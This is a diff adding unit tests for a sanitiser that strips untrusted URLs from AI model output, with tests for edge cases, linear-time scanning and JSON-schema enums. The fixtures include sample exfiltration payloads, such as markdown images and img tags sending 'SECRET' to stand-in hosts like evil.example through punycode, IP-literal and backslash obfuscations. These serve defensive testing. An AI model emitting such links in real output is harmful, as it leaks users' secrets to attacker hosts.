@@ -197,7 +197,113 @@ describe('validateAiOutput', () => {
     expect(r.ok).toBe(true)
     if (!r.ok) return
     expect(r.value.items[0]!.citations).toEqual(['E1'])
-    expect(r.droppedCitations).toEqual(['E7', 'https://x.test', '3'])
+    // A URL offered as a citation is not passed on either.
+    expect(r.droppedCitations).toEqual(['E7', AI_REMOVED_LINK_TEXT, '3'])
+    expect(r.strippedUrls).toBe(1)
+  })
+
+  it('removes URLs from dropped citations and from object keys', () => {
+    const raw = JSON.stringify({
+      summary: 'ok',
+      items: [{ text: 'x', citations: ['E1', 'https://evil.example/?d=owner-secret'] }],
+      extra: { 'https://evil.example/?d=secret': 'x', 'plain key': 'y' },
+    })
+    const WithRecord = Schema.extend({ extra: z.record(z.string(), z.string()) })
+    const r = validateAiOutput(raw, WithRecord, ctx)
+    expect(r.ok).toBe(true)
+    if (!r.ok) return
+    expect(r.droppedCitations).toEqual([AI_REMOVED_LINK_TEXT])
+    expect(Object.keys(r.value.extra)).toEqual([AI_REMOVED_LINK_TEXT, 'plain key'])
+    expect(r.strippedUrls).toBe(2)
+    expect(JSON.stringify(r)).not.toMatch(/evil\.example|secret/)
+  })
+
+  it('removes protocol-relative, backslash, IDN, punycode and IP-literal URLs', () => {
+    const attacks = [
+      '![chart](//пример.рф/SECRET)',
+      '![chart](//evil.xn--p1ai/SECRET)',
+      '![chart](//203.0.113.5/SECRET)',
+      '![chart](//evil.example\\SECRET)',
+      '![chart](\\\\evil.example\\SECRET)',
+      '![chart](/\\evil.example/SECRET)',
+      '![chart](///evil.example/SECRET)',
+      '![chart](https:\\\\evil.example\\SECRET)',
+      '![chart](x-custom://evil.example/SECRET)',
+      '<img src=//evil.example/SECRET>',
+      'see пример.рф/SECRET',
+      'see evil.xn--p1ai/SECRET',
+      'see 192.168.1.5/SECRET?d=x',
+      'see evil.example./SECRET',
+      'see evil.example\\SECRET',
+    ]
+    for (const text of attacks) {
+      const r = validateAiOutput(JSON.stringify({ summary: text, items: [] }), Schema, ctx)
+      expect(r.ok, text).toBe(true)
+      if (!r.ok) continue
+      expect(r.strippedUrls, text).toBe(1)
+      expect(r.value.summary, text).not.toContain('SECRET')
+      expect(r.value.summary, text).toContain(AI_REMOVED_LINK_TEXT)
+    }
+  })
+
+  it('does not let text after a quote, backtick or other character ride on an allowed URL', () => {
+    const allowed = ['https://feed.example.net/post?id=7']
+    for (const sep of ["'", '"', '`', '<', '>', '|', ' ', ')']) {
+      const text = `![x](https://feed.example.net/post?id=7${sep}SECRET)`
+      const r = stripAiUntrustedUrls(text, allowed)
+      expect(r.stripped, JSON.stringify(sep)).toBe(1)
+      expect(r.text, JSON.stringify(sep)).not.toContain('SECRET')
+    }
+    // Allowed links in ordinary punctuation are kept as written.
+    for (const text of [
+      'Source: https://feed.example.net/post?id=7.',
+      '(see https://feed.example.net/post?id=7), then',
+      '**https://feed.example.net/post?id=7**',
+      '<https://feed.example.net/post?id=7>',
+      '[post](https://feed.example.net/post?id=7)',
+      '"https://feed.example.net/post?id=7"',
+    ]) {
+      expect(stripAiUntrustedUrls(text, allowed), text).toEqual({ text, stripped: 0 })
+    }
+  })
+
+  it('leaves code and file names in prose alone', () => {
+    for (const prose of [
+      'Migrated the API from Express to Next.js/Vercel and kept Node.js/Deno compatibility.',
+      'Chose Chart.js/D3 for the charts.',
+      'See README.md#setup and package.json#L12 before editing page.tsx/layout.tsx.',
+      'The a//b and TCP//IP forms are paths, not hosts.',
+      'Attached invoice.pdf/receipt.pdf and notes.docx#page=2.',
+      '会議は明日。資料/議事録を確認してください。',
+    ]) {
+      expect(stripAiUntrustedUrls(prose, []), prose).toEqual({ text: prose, stripped: 0 })
+    }
+    // The same names become links once they carry a scheme, www. or a protocol-relative prefix.
+    for (const link of ['https://Next.js/Vercel', '//Next.js/Vercel', 'www.README.md#setup']) {
+      expect(stripAiUntrustedUrls(link, []).stripped, link).toBe(1)
+    }
+  })
+
+  it('scans adversarial strings in linear time', () => {
+    const inputs = [
+      'a.'.repeat(50_000),
+      'a-a.'.repeat(25_000),
+      'ab.'.repeat(32_000) + '1',
+      '_a'.repeat(50_000),
+      '/('.repeat(50_000),
+      'a:'.repeat(50_000),
+      'www.'.repeat(25_000),
+    ]
+    const started = performance.now()
+    for (const s of inputs) stripAiUntrustedUrls(s, ['https://feed.example.net/post?id=7'])
+    const r = validateAiOutput(
+      JSON.stringify({ summary: 'a-a.'.repeat(25_000), items: [] }),
+      z.object({ summary: z.string().max(2_000), items: z.array(z.never()) }),
+      ctx,
+    )
+    expect(r).toMatchObject({ ok: false, error: 'schema_mismatch' })
+    // Quadratic scanning took several seconds per input here; linear scanning takes milliseconds.
+    expect(performance.now() - started).toBeLessThan(1_000)
   })
 
   it('removes URLs the model invented but keeps provided source links', () => {
@@ -253,5 +359,25 @@ describe('aiResponseJsonSchema', () => {
       required: ['summary', 'tags'],
       additionalProperties: false,
     })
+  })
+
+  it('keeps string literal and discriminator values as enums', () => {
+    const schema = aiResponseJsonSchema(
+      z.object({
+        status: z.literal('done'),
+        next: z.discriminatedUnion('kind', [
+          z.object({ kind: z.literal('task'), title: z.string() }),
+          z.object({ kind: z.literal('question'), text: z.string() }),
+        ]),
+      }),
+    )
+    const props = schema.properties as Record<string, Record<string, unknown>>
+    expect(props.status).toEqual({ type: 'string', enum: ['done'] })
+    const branches = props.next!.oneOf as { properties: Record<string, unknown> }[]
+    expect(branches.map((b) => b.properties.kind)).toEqual([
+      { type: 'string', enum: ['task'] },
+      { type: 'string', enum: ['question'] },
+    ])
+    expect(JSON.stringify(schema)).not.toContain('"const"')
   })
 })
